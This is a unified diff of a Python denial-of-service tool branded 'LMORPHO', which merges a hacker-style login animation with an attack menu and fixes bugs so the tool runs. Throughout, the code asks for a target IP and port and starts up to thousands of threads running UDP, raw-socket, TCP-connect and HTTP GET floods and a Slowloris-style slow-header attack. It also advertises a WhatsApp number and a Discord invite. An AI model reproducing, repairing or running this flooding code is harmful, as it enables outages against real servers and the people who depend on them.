@@ -1,27 +1,35 @@
 import time
 import os
 import random
+import threading
+import socket
+import subprocess
+import requests
+import sys
+
 from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
 
 console = Console()
 
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-LMORPHO_text = "★ TOOLS BY LMORPHO DDOSING ★"
-
+# === Fix: Close the triple quote for dragon_frame
 dragon_frame = r"""
-██╗     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
-██║     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗
-██║     ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║██║   ██║
-██║     ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║
-███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║╚██████╔╝
-╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
+██████╗ ███╗   ███╗███████╗
+██╔══██╗████╗ ████║╚════██║
+██████╔╝██╔████╔██║    ██╔╝
+██╔══██╗██║╚██╔╝██║   ██╔╝
+██║  ██║██║ ╚═╝ ██║   ██║
+╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝"""
+
+# === Fix: Correct variable name
+LMORPHO_text = "★ TOOLS BY LMORPHO DDOSING ★"
 
 line_colors = ["green", "bright_green", "cyan", "magenta"]
 rain_chars = ["|", "!", "/", "\\", "1", "I"]
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def generate_rain(width, height, density=0.05):
     rain = []
@@ -32,9 +40,10 @@ def generate_rain(width, height, density=0.05):
 
 def scroll_rain(rain_lines, width, density=0.05):
     rain_lines.pop(0)
-    rain_lines.append("".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width)))
+    new_line = "".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width))
+    rain_lines.append(new_line)
 
-def hacker_interface(animated_time=5):  # Short animation duration
+def hacker_interface(animated_time=5):
     width = console.width
     height = console.height - 10
     rain_lines = generate_rain(width, height)
@@ -49,13 +58,13 @@ def hacker_interface(animated_time=5):  # Short animation duration
             color = line_colors[i % len(line_colors)]
             console.print(line, style=color)
 
-        console.print(" " * pos + f"[bold red]{lmorpho_text}[/bold red]")
+        console.print(" " * pos + f"[bold red]{LMORPHO_text}[/bold red]")
 
         panel = Panel(Text(dragon_frame, style="bold red"), title="[bold red]Access Granted[/bold red]", border_style="red", width=min(80, width - 6))
         console.print(panel, justify="center")
 
         pos += direction
-        if pos >= width - len(lmorpho_text) - 10:
+        if pos >= width - len(LMORPHO_text) - 10:
             direction = -1
         elif pos <= 0:
             direction = 1
@@ -71,33 +80,17 @@ def login_interface():
     if username == "LMORPHO" and password == "LMORPHO":
         console.print(f"[bold green]✔️ Welcome, {username}! Access granted.[/bold green]")
         time.sleep(0.5)
-        hacker_interface(animated_time=5)  # Short animation
+        hacker_interface(animated_time=5)
         clear()
         console.print("[bold green]✅ Starting the main tool...[/bold green]")
-        # You can insert your main tool code here
         time.sleep(1)
-        # start_main_tool()
+        main_tool()  # Redirect to attack tool
     else:
         console.print(Panel("[bold red]❌ Incorrect Username or Password![/bold red]", border_style="red"))
         time.sleep(1)
-        main()
+        login_interface()
 
-def main():
-    login_interface()
-
-if __name__ == "__main__":
-    main()
-import socket
-import time
-import random
-import threading
-import requests
-import sys
-import os
-import subprocess
-import struct
-
-# ألوان للواجهة
+# ===== COLORS =====
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -113,7 +106,6 @@ bots_active = 0
 
 BANNER = f"""
 {Colors.BOLD}{Colors.RED}
-
 ██╗     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
 ██║     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗
 ██║     ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║██║   ██║
@@ -122,12 +114,11 @@ BANNER = f"""
 ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
 {Colors.END}
 {Colors.CYAN}{'='*60}
-{Colors.BOLD}watssap:0620914764 methods attack TOOL (199+ BOTS SUPPORT)
+{Colors.BOLD}WHATSAPP:0620914764 METHODES ATTACK TOOL (199+ BOTS SUPPORT)
 {Colors.CYAN}{'='*60}{Colors.END}
 """
 
-# ===== POWR BOTS FUNCTIONS =====
-
+# ===== BOTS =====
 def http_bot(target, port, bot_id):
     global bots_active, attack_running
     try:
@@ -210,7 +201,7 @@ def launch_bots(attack_type, target, port, bots_count):
         elif attack_type == 4:
             t = threading.Thread(target=ping_bot, args=(target, bot_id))
         else:
-            print(f"{Colors.RED}Invalid attack type for launch_bots.{Colors.END}")
+            print(f"{Colors.RED}Invalid attack type.{Colors.END}")
             return
         
         t.start()
@@ -223,17 +214,15 @@ def launch_bots(attack_type, target, port, bots_count):
             print(f"{Colors.BOLD}Active BOTS: {bots_active}/{bots_count}{Colors.END}", end='\r')
             time.sleep(1)
     except KeyboardInterrupt:
-        attack_running = False
         print(f"\n{Colors.RED}[!] Stopping all bots...{Colors.END}")
+        attack_running = False
     
     for t in threads:
         t.join()
 
-# ===== RoMbo SCRIPT AS FUNCTION (بدون تسجيل دخول) =====
-
-def start_Lmorpho_attack():
+# ===== ADVANCED LMORPHO ATTACK =====
+def start_Lmorpho_attack():  # Fixed name consistency
     MAX_BOTS = 5000
-    MAX_PACKET_SIZE = 65500
     MAX_ATTACK_TIME = 3600  # 1 hour
 
     os.system("cls" if os.name == "nt" else "clear")
@@ -243,31 +232,23 @@ def start_Lmorpho_attack():
     time.sleep(2)
     os.system("cls" if os.name == "nt" else "clear")
 
-    print("""
+    print(f"""
 \033[1;35m
 	  AUTHOR TOOLS : RM7 LMORPHO - POWER EDITION
 
+{dragon_frame}
+    \033[0m""")
 
-███╗     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
-██║     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗
-██║     ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║██║   ██║
-██║     ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║
-███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║╚██████╔╝
-╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
-""")
-
-    ip = str(input(" Target IP: "))
+    ip = input(" Target IP: ").strip()
     port = int(input(" Target Port: "))
     attack_time = int(input(" Attack Duration (seconds): "))
     thread_count = int(input(" Attack Bots (1-5000): "))
     attack_mode = int(input(" Attack Mode [1-5]: "))
 
-    if thread_count < 1 or thread_count > MAX_BOTS:
-        thread_count = MAX_BOTS
-    if attack_time < 10 or attack_time > MAX_ATTACK_TIME:
-        attack_time = 300
-    if attack_mode < 1 or attack_mode > 5:
-        attack_mode = 1
+    # Clamp values
+    thread_count = max(1, min(thread_count, MAX_BOTS))
+    attack_time = max(10, min(attack_time, MAX_ATTACK_TIME))
+    attack_mode = max(1, min(attack_mode, 5))
 
     PACKET_TYPES = {
         1: (1024, "UDP"),     
@@ -280,45 +261,34 @@ def start_Lmorpho_attack():
     packet_size, attack_name = PACKET_TYPES[attack_mode]
     print(f"\033[1;33m[+] Starting {attack_name} attack with {thread_count} bots for {attack_time} seconds\033[0m")
 
-    def create_raw_socket():
-        try:
-            if os.name == 'nt':
-                return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                return s
-        except:
-            return None
-
     end_time = time.time() + attack_time
 
     def udp_flood():
         data = random._urandom(packet_size)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while time.time() < end_time:
+        while time.time() < end_time and attack_running:
             try:
                 s.sendto(data, (ip, port))
             except:
                 pass
+        s.close()
 
     def syn_flood():
-        raw_socket = create_raw_socket()
-        if not raw_socket:
-            return
-        
-        while time.time() < end_time:
+        while time.time() < end_time and attack_running:
             try:
-                raw_socket.sendto(random._urandom(packet_size), (ip, port))
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                s.sendto(random._urandom(packet_size), (ip, port))
+                s.close()
             except:
                 pass
 
     def ack_flood():
-        while time.time() < end_time:
+        while time.time() < end_time and attack_running:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, port))
                 s.send(random._urandom(packet_size))
+                s.close()
             except:
                 pass
 
@@ -328,7 +298,7 @@ def start_Lmorpho_attack():
             "Accept-Language: en-US,en;q=0.5",
             "Connection: keep-alive"
         ]
-        while time.time() < end_time:
+        while time.time() < end_time and attack_running:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, 80))
@@ -337,6 +307,7 @@ def start_Lmorpho_attack():
                     request += f"{header}\r\n"
                 request += "\r\n"
                 s.send(request.encode())
+                s.close()
             except:
                 pass
 
@@ -349,7 +320,7 @@ def start_Lmorpho_attack():
             "Content-Length: 1000000"
         ]
         sockets = []
-        while time.time() < end_time:
+        while time.time() < end_time and attack_running:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, 80))
@@ -361,12 +332,13 @@ def start_Lmorpho_attack():
                 sockets.append(s)
             except:
                 pass
-            
-            for s in sockets:
+
+            for s in list(sockets):
                 try:
                     s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                 except:
                     sockets.remove(s)
+                time.sleep(0.5)
 
     ATTACKS = {
         1: udp_flood,
@@ -377,75 +349,77 @@ def start_Lmorpho_attack():
     }
 
     threads = []
+    global attack_running
+    attack_running = True
 
     print(f"\033[1;31m[!] Launching {attack_name} attack with {thread_count} nuclear bots!\033[0m")
     time.sleep(2)
 
     for i in range(thread_count):
-        try:
-            t = threading.Thread(target=ATTACKS[attack_mode])
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        except:
-            pass
+        if not attack_running:
+            break
+        t = threading.Thread(target=ATTACKS[attack_mode])
+        t.daemon = True
+        t.start()
+        threads.append(t)
 
     start_time = time.time()
-    while time.time() < end_time:
-        elapsed = int(time.time() - start_time)
-        remaining = attack_time - elapsed
-        print(f"\033[1;33m[+] Attack in progress: {elapsed}s elapsed, {remaining}s remaining - {len(threads)} bots active\033[0m", end='\r')
-        time.sleep(1)
+    try:
+        while time.time() < end_time and attack_running:
+            elapsed = int(time.time() - start_time)
+            remaining = max(0, attack_time - elapsed)
+            print(f"\033[1;33m[+] Attack in progress: {elapsed}s elapsed, {remaining}s remaining - {len(threads)} bots active\033[0m", end='\r')
+            time.sleep(1)
+    except KeyboardInterrupt:
+        attack_running = False
 
-    print("\n\033[1;32m[+] Attack completed successfully! Target should be down!\033[0m")
+    attack_running = False
+    print("\n\033[1;32m[+] Attack completed!\033[0m")
     print("\033[1;36m[+] Join our community: discord.gg/8gmRVnRRwV\033[0m")
 
-
-# ===== MAIN PROGRAM =====
-def main():
+# ===== MAIN MENU =====
+def main_tool():
     global attack_running
-    
+    attack_running = True
+
     try:
         print(BANNER)
-        
-        print(f"{Colors.YELLOW}{'='*30} POWR Methods SETUP {'='*30}{Colors.END}")
+        print(f"{Colors.YELLOW}{'='*30} POWER METHODES SETUP {'='*30}{Colors.END}")
         print(f"{Colors.CYAN}1. HTTP Flood Attack")
         print("2. UDP Flood Attack SA-MP")
         print("3. TCP Flood Attack")
         print("4. ICMP Ping Flood")
-        print("5. ADVANCED LMORPHO ATTACK"+Colors.END)
-        
+        print("5. ADVANCED LMORPHO ATTACK" + Colors.END)
+
         choice = int(input("\nWhat kind of attack do you want? (1-5): "))
-        
+
         if choice not in [1, 2, 3, 4, 5]:
             print(f"{Colors.RED}[-] Invalid Choice!{Colors.END}")
             return
-        
+
         if choice == 5:
-            # نداء سكربت نودوس بدون تسجيل دخول
-            start_LMORPHO_attack()
+            start_Lmorpho_attack()  # Fixed: Correct function name
             return
-        
-        target = input("Target IP: ")
-        
+
+        target = input("Target IP: ").strip()
         port = 80
         if choice in [1, 2, 3]:
             port = int(input("Target Port: "))
-        
+
         bots_count = int(input("POWR BOTS Count (1-1000): "))
         bots_count = max(1, min(bots_count, 1000))
-        
+
         duration = int(input("Attack Duration (seconds): "))
-        
+
         print(f"\n{Colors.RED}{'='*30} ATTACK STARTED {'='*30}{Colors.END}")
         start_time = time.time()
-        
+
         attack_thread = threading.Thread(
             target=launch_bots,
             args=(choice, target, port, bots_count)
         )
         attack_thread.start()
-        
+
         try:
             while time.time() < start_time + duration and attack_running:
                 elapsed = int(time.time() - start_time)
@@ -453,19 +427,21 @@ def main():
                 print(f"{Colors.BOLD}Elapsed: {elapsed}s | Remaining: {remaining}s | Bots: {bots_active}/{bots_count}{Colors.END}", end='\r')
                 time.sleep(1)
         except KeyboardInterrupt:
-            pass
+            print(f"\n{Colors.RED}[!] Interrupted. Stopping...{Colors.END}")
+            attack_running = False
         finally:
             attack_running = False
             attack_thread.join()
-        
+
         print(f"\n\n{Colors.GREEN}{'='*30} ATTACK COMPLETED {'='*30}{Colors.END}")
         print(f"{Colors.YELLOW}Total Attack Duration: {duration} seconds")
         print(f"Maximum Bots Activated: {bots_count}{Colors.END}")
-        
+
     except Exception as e:
         print(f"{Colors.RED}[-] ERROR: {str(e)}{Colors.END}")
     finally:
         attack_running = False
 
+# === Entry Point ===
 if __name__ == "__main__":
-    main()
+    login_interface()  # Start with login
